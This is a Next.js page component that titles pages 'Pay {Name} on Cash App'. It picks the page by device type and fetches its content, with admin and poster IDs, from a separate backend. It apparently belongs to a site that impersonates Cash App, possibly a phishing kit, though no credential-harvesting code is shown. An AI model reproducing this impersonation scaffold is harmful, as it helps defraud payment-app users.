import Home from "@/app/components/Home";
import { site, API_URL } from "@/app/config/index";
import { headers } from "next/headers";

export async function generateMetadata({ params }) {
  const { param2 } = params;
  const capitalizedName = param2 ? param2.charAt(0).toUpperCase() + param2.slice(1) : "Emily";
  return {
    title: `Pay ${capitalizedName} on Cash App`,
    description: `Pay ${capitalizedName} on Cash App`,
  };
}

export default async function page({ params }) {
  const { param, param2 } = params;
  // console.log("Two Params Route:", param, param2);

  const headersList = headers();
  const userAgent = headersList.get("user-agent") || "";

  const isMobileView = userAgent.match(
    /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
  );

  const isTabletView = userAgent.match(
    /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
  );

  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";

  // Dynamic URL with site name, param, param2, and device

  const url = `${API_URL}/${site}/${param}/${param2}/${device}`;

//   console.log("API_URL",API_URL)
// console.log("site",site)
// console.log("device",device)
// console.log("param",param)
// console.log("param2",param2)
// console.log("url",url)


  try {
    const res = await fetch(url);
    const data = await res.json();
    console.log("Two Params Page data:", data);
// console.log(url)
//   console.log(API_URL)

    if (data?.success === "exists") {
      return <Home adminId={data.adminId} posterId={data.posterId} />;
    }
  } catch (error) {
    console.error("Error fetching dynamic page data:", error);
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-50">
      <div className="text-xl font-bold text-gray-400">No Page found!!</div>
    </div>
  );
}
